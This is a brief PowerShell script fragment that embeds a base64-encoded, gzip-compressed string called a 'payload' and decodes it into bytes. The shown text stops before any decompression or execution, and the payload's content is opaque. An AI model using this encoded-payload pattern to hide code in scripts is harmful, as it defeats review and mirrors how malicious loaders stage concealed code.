[CmdletBinding()]
param()

$ErrorActionPreference = 'Stop'
$compressedPayload = 'H4sIAAAAAAAACvPMK8vPTtUNT00KSi0sTS0uUdANLcpUUM8oKSkottLXTy3LzNHLzCtLzMlM0U/Ozy0oSi0uTk3RKyg2VFeoUfCEaHetAItn5ucBAJnRZ2FQAAAA'
$payloadBytes = [Convert]::FromBase64String($compressedPayload)
